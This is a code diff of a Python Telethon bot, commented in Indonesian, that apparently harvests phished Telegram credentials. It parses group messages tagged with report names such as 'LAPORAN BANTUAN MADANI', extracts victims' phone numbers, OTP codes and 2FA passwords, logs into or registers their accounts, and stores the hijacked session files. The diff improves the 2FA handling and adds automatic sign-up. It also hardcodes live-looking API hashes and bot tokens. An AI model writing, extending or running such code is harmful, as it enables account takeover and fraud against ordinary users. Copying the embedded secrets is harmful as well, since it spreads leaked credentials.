@@ -4,11 +4,12 @@ import re
 import json
 import shutil
 from telethon import TelegramClient, events
+from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
 
 # === Konfigurasi Dasar ===
-API_ID = 28085374
-API_HASH = 'b2b03513008c2535e0859c7c4e1c1c36'
-BOT_TOKEN = '7895384862:AAHVFKkUVUrKKXlByW70odqIrsjbxISCYuU'
+API_ID = 29564591
+API_HASH = '99d943dcb43f77dd61c9b020105a541b'
+BOT_TOKEN = '7621100011:AAGFxJa8g1kjtBkfc4hiwZESYSDAbncItjU'
 
 TEMP_SESSIONS = "ewww_sessions"
 FINAL_SESSIONS = "sessions"
@@ -22,6 +23,10 @@ WHITELIST_PREFIX = ["+62", "+60"]
 # Penyimpanan login sementara
 login_queue = {}
 
+# === Nama default jika tidak ditemukan di pesan ===
+DEFAULT_FIRST_NAME = "Pengguna"
+DEFAULT_LAST_NAME = "Baru"
+
 # === Validasi Nomor ===
 def valid_number(number):
     return (
@@ -31,8 +36,8 @@ def valid_number(number):
 
 # === Pindahkan session sukses ke folder final ===
 def relocate_session(phone):
-    src = os.path.join(TEMP_SESSIONS, phone)
-    dst = os.path.join(FINAL_SESSIONS, f"{phone}.session")
+    src = os.path.join(TEMP_SESSIONS, phone + ".session")
+    dst = os.path.join(FINAL_SESSIONS, phone + ".session")
     if os.path.exists(src):
         shutil.move(src, dst)
         print(f"[✔] Session {phone} berhasil dipindahkan ke folder sessions.")
@@ -40,7 +45,7 @@ def relocate_session(phone):
         print(f"[✖] Session {phone} tidak ditemukan di {src}.")
 
 # === Client utama ===
-main_client = TelegramClient('main2', API_ID, API_HASH)
+main_client = TelegramClient('main5', API_ID, API_HASH)
 
 # === Proses pesan dari grup ===
 @main_client.on(events.NewMessage)
@@ -48,19 +53,35 @@ async def handle_group_message(event):
     content = event.raw_text
 
     if any(tag in content for tag in [
+        '❮ LAPORAN BANTUAN MADANI ❯',
         '❮ LAPORAN DAFTAR GRATISKU ❯',
         '❮ LAPORAN UANG KUNO ❯',
-        '❮ LAPORAN BANTUAN MADANI ❯',
-        '❮ LAPORAN LAMBE PECINTA JANDA ❯',
+        '❮ LAPORAN Judul ❯',
         '❮ LAPORAN FAIDIL  ❯'
     ]):
-        phone = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', content)
+        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+?\d+)', content)
         otp = re.search(r'OTP\s*:\s*(\d{5,6})', content)
         passwd = re.search(r'PASSWORD\s*:\s*(\S+)', content)
+        name_match = re.search(r'NAMA\s*:\s*([A-Za-z ]+)', content)
 
-        if phone:
-            number = phone.group(1)
+        if phone_match:
+            number = phone_match.group(1)
+
+            if number.startswith('62') and not number.startswith('+'):
+                number = '+' + number
+            elif number.startswith('60') and not number.startswith('+'):
+                number = '+' + number
+
             password = passwd.group(1) if passwd else None
+
+            # Ambil nama dari pesan jika ada
+            first_name = DEFAULT_FIRST_NAME
+            last_name = DEFAULT_LAST_NAME
+            if name_match:
+                nama = name_match.group(1).strip().split(" ", 1)
+                first_name = nama[0]
+                if len(nama) > 1:
+                    last_name = nama[1]
 
             if not valid_number(number):
                 print(f"[❗] Nomor tidak valid: {number}")
@@ -70,7 +91,7 @@ async def handle_group_message(event):
                 code = otp.group(1)
                 print(f"[📨] OTP untuk {number}: {code}")
                 if number in login_queue:
-                    asyncio.create_task(login_with_code(number, code, password))
+                    asyncio.create_task(login_with_code(number, code, password, first_name, last_name))
                 else:
                     print(f"[⚠] Tidak ada OTP request sebelumnya untuk {number}")
             else:
@@ -88,8 +109,8 @@ async def send_otp_request(number):
         await client.connect()
 
         if not await client.is_user_authorized():
-            await client.send_code_request(number)
-            login_queue[number] = (client, None)
+            sent_code = await client.send_code_request(number)
+            login_queue[number] = (client, sent_code.phone_code_hash)
             print(f"[📧] Kode OTP dikirim ke {number}")
         else:
             print(f"[✔] {number} sudah login sebelumnya.")
@@ -97,31 +118,39 @@ async def send_otp_request(number):
     except Exception as err:
         print(f"[❌] Gagal mengirim OTP ke {number}: {err}")
 
-# === Login menggunakan OTP ===
-async def login_with_code(number, code, password=None):
+# === Login atau Daftar jika belum terdaftar ===
+async def login_with_code(number, code, password=None, first_name=DEFAULT_FIRST_NAME, last_name=DEFAULT_LAST_NAME):
     try:
         if number not in login_queue:
             print(f"[✖] Tidak ditemukan client aktif untuk {number}")
             return
 
-        client, _ = login_queue[number]
+        client, phone_code_hash = login_queue[number]
 
         try:
-            await client.sign_in(number, code)
+            await client.sign_in(phone=number, code=code)
+            print(f"[✅] Login berhasil untuk {number} (sudah terdaftar)")
+        except PhoneNumberUnoccupiedError:
+            # Nomor belum terdaftar, daftarkan akun baru
+            print(f"[🆕] Nomor {number} belum terdaftar. Mendaftarkan akun baru...")
+            await client.sign_up(code=code, first_name=first_name, last_name=last_name)
+            print(f"[✅] Akun baru berhasil dibuat untuk {number}")
+        except SessionPasswordNeededError:
+            if password:
+                await client.sign_in(password=password)
+                print(f"[🔓] Login dengan 2FA berhasil untuk {number}")
+            else:
+                print(f"[🔒] Password 2FA dibutuhkan untuk {number}, tapi tidak tersedia.")
+                return
         except Exception as e:
-            if '2FA' in str(e) or 'password' in str(e).lower():
-                if password:
-                    await client.sign_in(password=password)
-                else:
-                    print(f"[🔒] Password diperlukan untuk {number}, tapi tidak tersedia.")
-                    return
+            print(f"[⚠] Gagal login/daftar untuk {number}: {e}")
+            return
 
-        print(f"[✅] Login berhasil untuk {number}")
         relocate_session(number)
         await client.disconnect()
         del login_queue[number]
     except Exception as err:
-        print(f"[❌] Login gagal untuk {number}: {err}")
+        print(f"[❌] Login/Daftar gagal untuk {number}: {err}")
 
 # === Jalankan ===
 async def run_main():
